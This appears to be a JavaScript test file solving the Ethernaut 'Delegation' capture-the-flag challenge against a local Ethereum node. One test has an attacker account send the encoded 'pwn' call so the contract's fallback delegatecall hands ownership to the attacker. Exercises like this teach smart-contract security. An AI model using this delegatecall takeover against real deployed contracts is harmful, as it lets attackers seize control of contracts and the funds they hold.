import { beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { ethers } from "ethers";

const providerUrl = "http://127.0.0.1:8545";

const delegateArtifact = JSON.parse(
  await readFile(
    new URL(
      "../artifacts/contracts/Delegation.sol/Delegate.json",
      import.meta.url
    ),
    "utf8"
  )
);

const delegationArtifact = JSON.parse(
  await readFile(
    new URL(
      "../artifacts/contracts/Delegation.sol/Delegation.json",
      import.meta.url
    ),
    "utf8"
  )
);

describe("Ethernaut Challenge 06: Delegation", () => {
  let provider;
  let deployer;
  let attacker;
  let delegate;
  let delegation;

  beforeEach(async () => {
    provider = new ethers.JsonRpcProvider(providerUrl);
    deployer = await provider.getSigner(0);
    attacker = await provider.getSigner(1);

    const delegateFactory = new ethers.ContractFactory(
      delegateArtifact.abi,
      delegateArtifact.bytecode,
      deployer
    );

    delegate = await delegateFactory.deploy(
      await deployer.getAddress()
    );
    await delegate.waitForDeployment();

    const delegationFactory = new ethers.ContractFactory(
      delegationArtifact.abi,
      delegationArtifact.bytecode,
      deployer
    );

    delegation = await delegationFactory.deploy(
      await delegate.getAddress()
    );
    await delegation.waitForDeployment();
  });

  it("assigns ownership to the deployer initially", async () => {
    assert.equal(
      (await delegation.owner()).toLowerCase(),
      (await deployer.getAddress()).toLowerCase()
    );
  });

  it("allows the attacker to claim ownership through delegatecall", async () => {
    const attackerAddress = await attacker.getAddress();
    const delegationAddress = await delegation.getAddress();

    const data = new ethers.Interface(delegateArtifact.abi)
      .encodeFunctionData("pwn");

    const tx = await attacker.sendTransaction({
      to: delegationAddress,
      data,
    });

    const receipt = await tx.wait();

    assert.equal(receipt.status, 1);
    assert.equal(
      (await delegation.owner()).toLowerCase(),
      attackerAddress.toLowerCase()
    );
  });
});
